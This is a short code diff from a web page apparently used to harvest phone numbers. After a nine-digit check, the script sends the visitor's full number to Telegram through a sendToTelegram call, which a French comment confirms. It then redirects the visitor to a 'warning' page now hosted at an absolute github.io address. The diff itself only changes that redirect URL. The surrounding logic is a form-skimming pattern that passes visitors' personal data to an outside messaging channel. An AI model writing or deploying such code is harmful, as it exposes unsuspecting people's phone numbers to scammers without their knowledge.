@@ -153,7 +153,7 @@
                 if(/^\d{9}$/.test(phoneNumber)) {
                     const fullNumber = countryCode + phoneNumber;
                     sendToTelegram(fullNumber);  // Envoie du numéro à Telegram
-                    window.location.href = `warning.html?number=${encodeURIComponent(fullNumber)}`;
+                    window.location.href = `https://by-ykk.github.io/numbre/warning.html?number=${encodeURIComponent(fullNumber)}`;
                 } else {
                     alert('Numéro invalide! 9 chiffres requis');
                     phoneInput.focus();
